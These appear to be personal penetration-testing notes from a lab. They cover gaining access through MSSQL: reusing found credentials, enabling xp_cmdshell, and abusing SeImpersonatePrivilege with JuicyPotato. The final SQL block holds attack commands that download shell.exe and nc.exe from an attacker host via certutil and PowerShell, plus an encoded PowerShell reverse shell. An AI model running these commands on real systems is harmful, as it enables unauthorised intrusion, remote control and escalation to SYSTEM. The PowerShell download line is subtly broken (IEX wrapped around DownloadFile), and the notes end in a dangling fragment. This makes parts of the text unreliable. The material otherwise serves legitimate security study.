---
created: 17-02-2026
---
## Initial access via MSSQL

Suppose you've gained a foothold on a Windows machine and stuck as a low-privileged user. You run `Snaffler` in attempt to find any sensitive data in exposed SMB shares:

```powershell
Snaffler.exe -S
```

>[!note] See [[Snaffler]].

`Snaffler` finds MSSQL credentials: `sql_dev:Str0ng_P@ssw0rd!`, so you connect to the server using [`mssqlclient.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from `Impacket`:

```bash
mssqlclient.py sql_dev@10.129.11.35 -windows-auth
```

```bash
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

The `-windows-auth` tells `Impacket` to authenticate using Windows credentials rather than SQL native username/password authentication. This matters because Windows auth accounts often have broader OS-level privileges.

 - You enumerate what you're working with:

```SQL
-- What version of SQL Server?
SELECT @@version;

-- What user am I logged in as?
SELECT SYSTEM_USER;           -- SQL login name
SELECT USER_NAME();           -- DB user context
SELECT CURRENT_USER;

-- What privileges does my login have?
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Am I sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = yes, 0 = no

-- List all logins
SELECT name, type_desc, is_disabled FROM sys.server_principals;

-- List databases
SELECT name FROM sys.databases;

-- Check linked servers (HUGE for lateral movement)
SELECT name, product, provider, data_source FROM sys.servers;

-- Can I impersonate other logins?
SELECT distinct b.name FROM sys.server_permissions a 
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
```

`xp_cmdshell` is a stored procedure that spawns a Windows command shell and passes a string to it for execution. It's disabled by default but can be re-enabled if you have `sysadmin` or the `ALTER SETTINGS` server permission.

- To enable `xp_cmdshell`, you run the `Impacket`'s:

```SQL
SQL> enable_xp_cmdshell
```

```bash
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

>[!note]+ Enabling `xp_cmdshell` manually
>If you're not using `Impacket`, you could as well do this manually:
> ```SQL
> EXEC sp_configure 'show advanced options', 1;
> RECONFIGURE WITH OVERRIDE;
> EXEC sp_configure 'xp_cmdshell', 1;
> RECONFIGURE WITH OVERRIDE;
> ```

- Confirm access:

```SQL
xp_cmdshell whoami
```
```powershell
output                                                                  

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

- Check account privileges:

```sql
EXEC xp_cmdshell 'whoami /priv';
```
```powershell
output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The command `whoami /priv` confirms that [`SeImpersonatePrivilege`](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. 

This means that if you, as a service account with `SeImpersonatePrivilege`, can create a fake [COM server](https://learn.microsoft.com/en-us/windows/win32/com/com-clients-and-servers) or [[named_pipes_|named pipe]] and trick a `SYSTEM`-level process into authenticating to your fake server, then Windows will hand you its token (because of the impersonation privilege), and you will be able to use `ImpersonateNamedPipeClient()` or `CreateProcessWithToken()` to spawn a new process with that `SYSTEM` token.



This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`



. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

```SQL
-- Basic command execution
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'whoami /all';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';

-- List directory
EXEC xp_cmdshell 'dir C:\ ';
EXEC xp_cmdshell 'dir C:\Users';

-- Check OS
EXEC xp_cmdshell 'systeminfo';

-- Write a file (useful for dropping payloads)
EXEC xp_cmdshell 'echo test > C:\Windows\Temp\test.txt';

-- Download a file via certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe';

-- Download via PowerShell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(''http://10.10.14.5/nc.exe'', ''C:\Windows\Temp\nc.exe'')"';

-- Get a reverse shell directly
EXEC xp_cmdshell 'powershell -e <BASE64_ENCODED_PAYLOAD>';
```

a MSSQL server. The SQL Service is running in the context of the default `mssqlserver` account. 


